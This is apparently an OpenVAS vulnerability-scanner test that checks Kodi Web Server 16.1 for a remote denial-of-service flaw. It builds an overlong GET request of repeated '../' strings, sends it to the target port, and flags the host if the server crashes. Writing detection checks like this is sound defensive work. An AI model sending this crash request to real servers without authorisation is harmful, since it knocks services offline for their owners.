##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_kodi_web_server_server_remote_dos_vuln.nasl 5612 2017-03-20 10:00:41Z teissa $
#
# Kodi Web Server Remote Denial Of Service Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:kodi:kodi_web_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808283");
  script_version("$Revision: 5612 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-03-20 11:00:41 +0100 (Mon, 20 Mar 2017) $");
  script_tag(name:"creation_date", value:"2016-08-08 18:13:32 +0530 (Mon, 08 Aug 2016)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Kodi Web Server Remote Denial Of Service Vulnerability");

  script_tag(name: "summary" , value:"The host is running Kodi Web Server
  and is prone to remote denial of service vulnerability.");

  script_tag(name: "vuldetect" , value:"Send a crafted request via HTTP GET
  and check whether it is able to crash or not.");

  script_tag(name: "insight" , value:"The flaw is due to an error when processing
  web requests and can be exploited to cause a buffer overflow via an overly long
  string passed to GET request.");

  script_tag(name: "impact" , value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.

  Impact Level: Application");

  script_tag(name: "affected" , value:"Kodi Web Server version 16.1");

  script_tag(name: "solution" , value:"There is no fix for the vulnerability and there never 
  will be one. The version mentioned here is the latest available version.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/40208");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_kodi_web_server_detect.nasl");
  script_mandatory_keys("Kodi/WebServer/installed");
  script_require_ports("Services/www", 8080);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
sndReq = "";
rcvRes = "";
http_port = 0;
craftData = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Cross Confirm to avoid FP
if(http_is_dead(port:http_port)){
  exit(0);
}

## Constructing Crap data
craftData= crap(length:300, data:"../");

## Sending request and receive response
sndReq = 'GET ' + craftData + ' HTTP/1.1\r\n\r\n';
rcvRes = http_send_recv(port:http_port, data:sndReq);

## confirm the exploit
if(http_is_dead(port:http_port))
{
  security_message(http_port);
  exit(0);
}
